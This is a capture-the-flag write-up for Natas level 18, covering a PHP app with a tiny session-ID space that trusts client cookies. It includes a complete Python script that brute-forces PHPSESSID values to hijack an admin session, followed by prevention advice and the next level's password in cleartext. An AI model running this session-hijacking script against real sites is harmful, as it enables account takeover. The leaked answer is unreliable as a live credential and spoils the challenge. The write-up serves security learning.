# Natas Level 18 → 19

## Objective

Retrieve the password for the next level by exploiting weak session management.

The application does not allow administrator login through normal authentication, but it generates predictable session IDs.

The goal is to discover an existing administrator session and use it to retrieve the credentials for **natas19**.

---

## Enumeration

- Logged into the application using random credentials.
- Always received the message:

```text
You are logged in as a regular user.
```

- Reviewed the source code.
- Observed that administrator authentication had been disabled.
- Found that session IDs are generated randomly between **1 and 640**.
- Noticed the application trusts the `PHPSESSID` cookie supplied by the client.

---

# Source Code Analysis

The administrator login function is:

```php
function isValidAdminLogin() {

    if($_REQUEST["username"] == "admin") {

        //return 1;

    }

    return 0;
}
```

Originally, the application granted administrator privileges when the username was `admin`.

However, the critical line has been commented out.

As a result:

```php
isValidAdminLogin()
```

always returns:

```text
0
```

Every newly created session becomes a regular user.

---

## Session ID Generation

The application generates session IDs using:

```php
$maxid = 640;

function createID($user) {

    global $maxid;

    return rand(1, $maxid);

}
```

Every new login receives a session ID between:

```text
1 → 640
```

Since only **640 possible session IDs** exist, the search space is extremely small.

---

## Session Creation

When a user logs in:

```php
session_id(createID($_REQUEST["username"]));
session_start();

$_SESSION["admin"] = isValidAdminLogin();
```

Example:

```text
Generated Session ID = 243
```

The server stores:

```text
Session 243

admin = 0
```

because administrator login has been disabled.

---

## Loading Existing Sessions

Whenever the browser sends a request, the application checks for an existing session cookie.

```php
if(array_key_exists("PHPSESSID", $_COOKIE)
    && isValidID($_COOKIE["PHPSESSID"])) {

    session_start();

}
```

The server simply loads whichever session ID is supplied inside the cookie.

Example:

```text
Cookie:

PHPSESSID=417
```

The server loads:

```text
Session 417
```

No verification is performed to ensure that the session belongs to the current user.

---

## Administrator Check

Administrator access depends entirely on:

```php
if($_SESSION["admin"] == 1)
```

If true, the application prints the credentials for **natas19**.

Otherwise:

```text
You are logged in as a regular user.
```

---

# Vulnerability

## Insecure Session Management

Instead of verifying ownership of the session, the application blindly trusts the session ID supplied by the client.

Because session IDs are generated from only **1 to 640**, they can easily be guessed.

If an administrator session already exists, an attacker can simply reuse it.

---

# Why Binary Search Doesn't Work

Unlike the previous level, this challenge is **not** based on SQL Injection.

There is no way to ask questions such as:

```text
Is session ID > 320?
```

or

```text
Is session ID < 100?
```

The application only answers one question:

```text
Is this exact session an administrator?
```

Each session ID must therefore be tested individually.

Binary search cannot reduce the search space.

---

# Exploitation Strategy

Instead of creating an administrator account, search for one that already exists.

For each possible session ID:

1. Replace the `PHPSESSID` cookie.
2. Send a request.
3. Check whether the response contains:

```text
You are an admin.
```

If found:

- Record the session ID.
- Read the credentials for the next level.

---

# Automation

Since only **640** possible session IDs exist, brute force can automate the process.

## Logic

```python
for every session ID:

    send request

    if response contains
    "You are an admin":

        stop

        print credentials
```

---

# Improved Exploit Script

```python
import requests

URL = "http://natas18.natas.labs.overthewire.org"

USERNAME = "natas18"
PASSWORD = "<LEVEL17_PASSWORD>"

session = requests.Session()
session.auth = (USERNAME, PASSWORD)

MAX_SESSION_ID = 640

print(f"[*] Starting brute force (1-{MAX_SESSION_ID})...\n")

for session_id in range(1, MAX_SESSION_ID + 1):

    cookies = {
        "PHPSESSID": str(session_id)
    }

    try:
        response = session.get(
            URL,
            cookies=cookies,
            timeout=5
        )

        print(
            f"\r[*] Testing Session ID: {session_id}/{MAX_SESSION_ID}",
            end="",
            flush=True
        )

        if "You are an admin" in response.text:

            print("\n\n[+] Admin session found!")
            print(f"[+] Session ID : {session_id}")

            print("\nCredentials:\n")

            print(response.text)

            break

    except requests.exceptions.RequestException:

        print(
            f"\n[!] Failed while testing Session {session_id}"
        )

else:

    print("\n[-] No admin session found.")
```

---

# Script Explanation

## `requests.Session()`

```python
session = requests.Session()
```

Creates a persistent HTTP session.

This avoids creating a new TCP connection for every request, making the brute-force attack faster.

---

## HTTP Authentication

```python
session.auth = (USERNAME, PASSWORD)
```

Automatically sends the HTTP Basic Authentication credentials with every request.

---

## Maximum Session ID

```python
MAX_SESSION_ID = 640
```

The source code revealed:

```php
$maxid = 640;
```

Therefore, only session IDs between **1 and 640** need to be tested.

---

## Brute Force Loop

```python
for session_id in range(1, MAX_SESSION_ID + 1):
```

Tests every possible session ID.

---

## Creating the Cookie

```python
cookies = {
    "PHPSESSID": str(session_id)
}
```

Creates a custom session cookie.

Example:

```text
PHPSESSID=428
```

The server loads Session **428**.

---

## Sending the Request

```python
response = session.get(
    URL,
    cookies=cookies,
    timeout=5
)
```

Sends a request using the chosen session ID.

The timeout prevents the script from waiting indefinitely if the server stops responding.

---

## Progress Tracking

```python
print(
    f"\r[*] Testing Session ID: {session_id}/{MAX_SESSION_ID}",
    end="",
    flush=True
)
```

Displays the current progress on a single console line.

Example:

```text
[*] Testing Session ID: 312/640
```

---

## Detecting an Administrator

```python
if "You are an admin" in response.text:
```

Searches the returned webpage for the administrator message.

If present, the correct session has been found.

---

## Displaying the Result

```python
print(response.text)
```

Prints the administrator page containing the credentials for the next level.

---

## Exception Handling

```python
except requests.exceptions.RequestException:
```

Handles temporary network failures without terminating the script.

---

## Loop Completion

```python
else:
    print("No admin session found.")
```

Executed only if all session IDs have been tested without discovering an administrator session.

---

# Attack Flow

```
Open Login Page
        |
        v
Review Source Code
        |
        v
Find Session Management
        |
        v
Notice Session IDs Range
        |
        v
Discover Server Trusts
Client Cookie
        |
        v
Brute Force PHPSESSID
        |
        v
1
2
3
...
640
        |
        v
Administrator Session Found
        |
        v
Retrieve Next Password
```

---

# Result

The administrator session was successfully discovered by brute-forcing the small session ID space.

Since the application trusted client-supplied session IDs without verifying ownership, it was possible to hijack an existing administrator session and obtain the credentials for **natas19**.

---

# Prevention

- Generate cryptographically secure session IDs.
- Never use a small session ID space.
- Regenerate session IDs after authentication.
- Validate session ownership before granting access.
- Expire inactive sessions regularly.
- Use secure cookie attributes such as `HttpOnly` and `Secure`.

---

# Key Takeaways

- Weak session management can completely bypass authentication.
- Session IDs should be unpredictable and unguessable.
- Never trust client-supplied session identifiers.
- Small session ID spaces are vulnerable to brute-force attacks.
- `requests.Session()` improves performance by reusing HTTP connections.
- Progress tracking makes long-running brute-force attacks easier to monitor.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas19
Password : qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
```

</details>